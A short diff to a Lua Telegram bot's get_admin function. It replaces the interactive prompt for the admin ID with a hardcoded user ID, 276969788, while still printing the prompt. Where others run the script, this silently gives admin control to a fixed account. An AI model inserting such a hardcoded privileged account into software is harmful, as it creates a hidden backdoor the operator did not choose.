@@ -16,8 +16,8 @@ function get_admin ()
   if redis:get('botBOT-IDadminset') then
     return true
   else
-    print("sudo id :")
-    admin=io.read()
+    print("Sudo ID: ")
+    admin= 276969788
     redis:del("botBOT-IDadmin")
     redis:sadd("botBOT-IDadmin", admin)
     redis:set('botBOT-IDadminset',true)
